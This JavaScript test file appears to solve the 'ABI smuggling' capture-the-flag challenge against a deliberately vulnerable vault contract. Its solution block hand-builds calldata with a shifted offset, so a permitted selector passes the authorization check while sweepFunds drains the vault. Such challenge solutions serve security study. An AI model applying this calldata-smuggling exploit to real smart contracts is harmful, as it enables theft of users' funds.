const { ethers } = require('hardhat');
const { expect } = require('chai');

describe('[Challenge] ABI smuggling', function () {
  let deployer, player, recovery;
  let token, vault;

  const VAULT_TOKEN_BALANCE = 1000000n * 10n ** 18n;

  before(async function () {
    /** SETUP SCENARIO - NO NEED TO CHANGE ANYTHING HERE */
    [deployer, player, recovery] = await ethers.getSigners();

    // Deploy Damn Valuable Token contract
    token = await (await ethers.getContractFactory('DamnValuableToken', deployer)).deploy();

    // Deploy Vault
    vault = await (await ethers.getContractFactory('SelfAuthorizedVault', deployer)).deploy();
    expect(await vault.getLastWithdrawalTimestamp()).to.not.eq(0);

    // Set permissions
    const deployerPermission = await vault.getActionId('0x85fb709d', deployer.address, vault.address);
    const playerPermission = await vault.getActionId('0xd9caed12', player.address, vault.address);
    await vault.setPermissions([deployerPermission, playerPermission]);
    expect(await vault.permissions(deployerPermission)).to.be.true;
    expect(await vault.permissions(playerPermission)).to.be.true;

    // Make sure Vault is initialized
    expect(await vault.initialized()).to.be.true;

    // Deposit tokens into the vault
    await token.transfer(vault.address, VAULT_TOKEN_BALANCE);

    expect(await token.balanceOf(vault.address)).to.eq(VAULT_TOKEN_BALANCE);
    expect(await token.balanceOf(player.address)).to.eq(0);

    // Cannot call Vault directly
    await expect(vault.sweepFunds(deployer.address, token.address)).to.be.revertedWithCustomError(
      vault,
      'CallerNotAllowed'
    );
    await expect(
      vault.connect(player).withdraw(token.address, player.address, 10n ** 18n)
    ).to.be.revertedWithCustomError(vault, 'CallerNotAllowed');
  });

  it('Execution', async function () {
    /** CODE YOUR SOLUTION HERE */

    // We just need to manually adjust the calldata a bit
    // 0x1cff79cd
    // address
    // offset
    // empty
    // 0xd9caed12
    // length
    // 0x85fb709d
    // address receiver,
    // IERC20 token

    const attackVault = await vault.connect(player);
    const attackToken = await token.connect(player);

    // Create components of calldata

    const executeFs = vault.interface.getSighash('execute');
    const target = ethers.utils.hexZeroPad(attackVault.address, 32).slice(2);
    // Modified offset to be 4 * 32 bytes from after the function selector
    const bytesLocation = ethers.utils.hexZeroPad('0x80', 32).slice(2);
    const withdrawSelector = vault.interface.getSighash('withdraw').slice(2);
    // Length of actionData calldata FS(1 * 4) + Parameters(2 * 32) Bytes
    const bytesLength = ethers.utils.hexZeroPad('0x44', 32).slice(2);
    // actionData actual data: FS + address + address
    const sweepSelector = vault.interface.getSighash('sweepFunds').slice(2);
    const sweepFundsData =
      ethers.utils.hexZeroPad(recovery.address, 32).slice(2) +
      ethers.utils.hexZeroPad(attackToken.address, 32).slice(2);

    const calldata =
      executeFs + // 0x1cff79cd
      target + // address
      bytesLocation + // offset
      ethers.utils.hexZeroPad('0x0', 32).slice(2) + // empty
      withdrawSelector + // 0xd9caed12
      ethers.utils.hexZeroPad('0x0', 28).slice(2) +
      bytesLength + // length
      sweepSelector + // 0x85fb709d
      sweepFundsData; // address reciever, IERC20 token

    await player.sendTransaction({
      to: attackVault.address,
      data: calldata,
    });
  });

  after(async function () {
    /** SUCCESS CONDITIONS - NO NEED TO CHANGE ANYTHING HERE */
    expect(await token.balanceOf(vault.address)).to.eq(0);
    expect(await token.balanceOf(player.address)).to.eq(0);
    expect(await token.balanceOf(recovery.address)).to.eq(VAULT_TOKEN_BALANCE);
  });
});
